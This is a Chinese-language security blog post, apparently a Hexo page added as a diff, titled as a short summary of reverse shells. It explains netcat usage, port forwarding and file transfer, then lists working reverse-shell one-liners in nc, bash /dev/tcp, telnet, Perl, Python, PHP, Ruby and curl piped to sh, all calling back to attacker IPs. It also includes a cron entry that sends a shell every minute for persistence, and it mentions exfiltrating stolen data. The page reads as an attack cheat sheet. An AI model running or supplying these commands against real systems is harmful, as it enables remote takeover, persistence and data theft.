@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        反弹shell小总结 | 东隅's blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/jocker.png"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
+            
+              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
+            
+              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">反弹shell小总结</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/%E9%80%9A%E7%94%A8/" class="post-tag">#通用</a>
+  
+
+
+          <span class="post-date">2023-05-20</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body--toc">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#nc"><span class="toc-text">nc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E5%8F%82%E6%95%B0"><span class="toc-text">主要参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F"><span class="toc-text">扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%8A%E5%A4%A9"><span class="toc-text">聊天</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell"><span class="toc-text">shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86"><span class="toc-text">代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93"><span class="toc-text">传输</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nc-e"><span class="toc-text">nc -e</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E9%81%93"><span class="toc-text">管道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#telnet"><span class="toc-text">telnet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash"><span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-text">定时任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl"><span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python"><span class="toc-text">python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl"><span class="toc-text">curl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-text">php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ruby"><span class="toc-text">ruby</span></a></li></ol></li></ol>
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <blockquote>
+<p>反弹shell，就是攻击机监听在某个TCP/UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p>
+<p>反弹shell通常适用于如下几种情况：</p>
+<ul>
+<li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li>
+<li>目标机端口被占用。</li>
+<li>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</li>
+<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</li>
+<li>……</li>
+</ul>
+<p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p>
+</blockquote>
+<p>原理：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/</a></p>
+<h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><blockquote>
+<p>nc全称为netcat</p>
+<p>既是一个端口扫描工具，也是一款安全工具，还能是一款监测工具，甚至可以做为一个简单的 TCP 代理。</p>
+</blockquote>
+<p>作用</p>
+<ol>
+<li>实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口</li>
+<li>端口的扫描，nc可以作为client发起TCP或UDP连接</li>
+<li>机器之间传输文件</li>
+<li>机器之间网络测速</li>
+</ol>
+<h2 id="主要参数"><a href="#主要参数" class="headerlink" title="主要参数"></a>主要参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">-c shell commands	 与&#x27;-e&#x27;一样效果（use /bin/sh to exec ）</span><br><span class="line"></span><br><span class="line">-e filename      	程序重定向</span><br><span class="line"></span><br><span class="line">-d                 无命令行界面,使用后台模式</span><br><span class="line"></span><br><span class="line"> -i &lt;延迟秒数&gt;      设置时间间隔，以便传送信息及扫描通信端口；</span><br><span class="line"></span><br><span class="line">-l                 监听模式，用于入站连接 </span><br><span class="line"></span><br><span class="line">-L                监听模式，连接关闭后仍然继续监听，直到CTR+C </span><br><span class="line"></span><br><span class="line">-n                IP地址，不能用域名 </span><br><span class="line"></span><br><span class="line">-o &lt;文件名&gt;       记录16进制的传输 </span><br><span class="line"></span><br><span class="line">-p &lt;端口&gt;          本地端口号 </span><br><span class="line"></span><br><span class="line">-r                随机本地及远程端口 </span><br><span class="line"></span><br><span class="line">-s &lt;地址&gt;         设置本地主机送出数据包的IP地址</span><br><span class="line"></span><br><span class="line">-t                使用Telnet交互方式 </span><br><span class="line"></span><br><span class="line">-T tos            set Type Of Service</span><br><span class="line"></span><br><span class="line">-u                UDP模式 </span><br><span class="line"></span><br><span class="line">-v                详细输出，用-vv将更详细 </span><br><span class="line"></span><br><span class="line">-w &lt;数字&gt;          timeout延时间隔 </span><br><span class="line"></span><br><span class="line">-z                 将输入，输出关掉（用于扫描时） </span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -v ip port            #扫瞄某 IP 的某个端口，返回端口信息详细输出。如：nc -v 96.44.174.9 80</span><br><span class="line"></span><br><span class="line">nc -v -z ip port-port            #扫描某IP的端口段，返回端口信息详细输出，但扫描速度很慢。如：nc -v -z 96.44.174.9 80-1024</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="聊天"><a href="#聊天" class="headerlink" title="聊天"></a>聊天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777                        #将监听到的信息输出到当前CMD窗口，这也是反弹shell的基础。</span><br><span class="line">nc -l -p 7777 &gt; C:/log.dat            #将监听到的信息输出到 C:/log.dat 下的日志文件里。</span><br><span class="line"></span><br><span class="line">nc -nvv 192.168.111.128 7777            #连接到192.168.1.101主机的7777</span><br><span class="line">完成上面两步相当于可以即时聊天了</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>正向</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">靶机：nc -lvvp 7777 -e /bin/bash</span><br><span class="line">本地：nc 192.168.242.129 7777</span><br><span class="line">我找它的ip</span><br></pre></td></tr></table></figure>
+
+<p>反向</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">靶机：nc -e /bin/bash 192.168.1.101 7777</span><br><span class="line">本地：nc -lvvp 7777</span><br><span class="line">他找我的ip</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><blockquote>
+<p>在内网渗透中，端口转发可以用于实现以下几种应用：</p>
+<ol>
+<li>提供远程访问：当你成功渗透到目标网络的内部设备时，你可能希望通过互联网远程访问其他内部设备，但这些设备不可直接从互联网访问。通过设置端口转发，你可以将外部网络发送到一个可访问的端口，然后将流量转发到内部网络中的目标设备和端口上，从而实现远程访问。</li>
+<li>绕过防火墙限制：目标网络可能有一些防火墙规则，限制了对某些特定端口或服务的访问。通过端口转发，你可以将外部网络发送到允许访问的端口上，然后将流量转发到被限制的端口上，以绕过防火墙限制，实现对受限制服务的访问。</li>
+<li>横向移动：一旦你在内网中获得了一个跳板或者受害者机器的访问权限，你可能希望探索其他内部网络的主机。通过设置端口转发，你可以将外部网络发送到你所控制的机器上的某个端口上，并将流量转发到其他内部网络主机上的特定端口上，以实现横向移动。</li>
+<li>数据泄露：在内网渗透中，你可能需要将从目标网络中窃取的数据传输到外部服务器。通过设置端口转发，你可以将外部网络发送到你的机器上的某个端口上，并将窃取的数据传输到这个端口，然后通过转发，将数据发送到外部服务器上。</li>
+</ol>
+<p>nc -p -l  80 -c  ‘nc ip port’</p>
+</blockquote>
+<p>所有连接到 80 端口的连接都会转发到 8080 端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp  80 -c  &#x27;nc -l 8080&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8080 | nc 192.168.1.200 80</span><br></pre></td></tr></table></figure>
+
+<p>所有发往我们服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口。 不过由于我们使用了管道，数据只能被单向传输。 要同时能够接受返回的数据，我们需要创建一个双向管道。 使用下面命令可以做到这点:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfifo 2way</span><br><span class="line">nc -l 8080 0&lt;2way | nc 192.168.1.200 80 1&gt;2way</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="传输"><a href="#传输" class="headerlink" title="传输"></a>传输</h2><p>(下面是我给目标主机传)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我：</span><br><span class="line">nc -vv IP port &lt; C:/http.txt            #提交http.txt内数据包到www.91ri.org的80端口，-vv参数会使速度变慢，但可以跟踪过程。例如IISput漏洞就可以自定义数据包使用此方法提交。如：nc -vv www.91ri.org 80 &lt; C:/http.txt</span><br><span class="line">nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称 </span><br><span class="line"></span><br><span class="line">目标主机：</span><br><span class="line">nc -vv 我的IP 我的端口 &gt; 存放文件的路径及名称</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9488">https://xz.aliyun.com/t/9488</a></p>
+<h2 id="nc-e"><a href="#nc-e" class="headerlink" title="nc -e"></a>nc -e</h2><p>正向</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">靶机：nc -lvvp 7777 -e /bin/bash</span><br><span class="line">本地：nc 192.168.242.129 7777</span><br><span class="line">我找它的ip</span><br></pre></td></tr></table></figure>
+
+<p>反向</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">靶机：nc -e /bin/bash 192.168.1.101 7777</span><br><span class="line">本地：nc -lvvp 7777</span><br><span class="line">他找我的ip</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>mknod需要root用户，但是也可以通过<strong>mkfifo /tmp/backpipe</strong>也可以创建一个管道。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">靶机：mknod /tmp/backpipe p</span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.101 7777 1&gt;/tmp/backpipe</span><br><span class="line">本地：nc -lnvp 7777</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>方法一</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure>
+
+<p>方法二</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机：telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000</span><br><span class="line"></span><br><span class="line">攻击机开两个监听</span><br><span class="line">nc -lvvp 2333</span><br><span class="line">nc -lvvp 4000</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机：bash -c &#x27;sh -i &amp;&gt;/dev/tcp/192.168.1.101/7777 0&gt;&amp;1&#x27;</span><br><span class="line">或者  bash -i &gt;&amp; /dev/tcp/192.168.1.101/7777 0&gt;&amp;1</span><br><span class="line">或者  bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.101/7777 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line">本地：nc -lvvp 7777</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机：perl -e &#x27;use Socket;$i=&quot;192.168.1.101&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;192.168.1.101:7777&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.101&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://your-shell.com/ip:port |sh</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;47.xxx.xxx.72&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9488">https://xz.aliyun.com/t/9488</a></p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/05/21/2023-05-21/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>2023-5-21</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/05/19/%E7%BB%95%E8%BF%87open_basedir/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      绕过open_basedir
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
+                    <a class="foot-link" href="">735587142</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+  
+  
+    <script type="text/javascript" src=/js/toc.js></script>
+  
+
+  </body>
+</html>
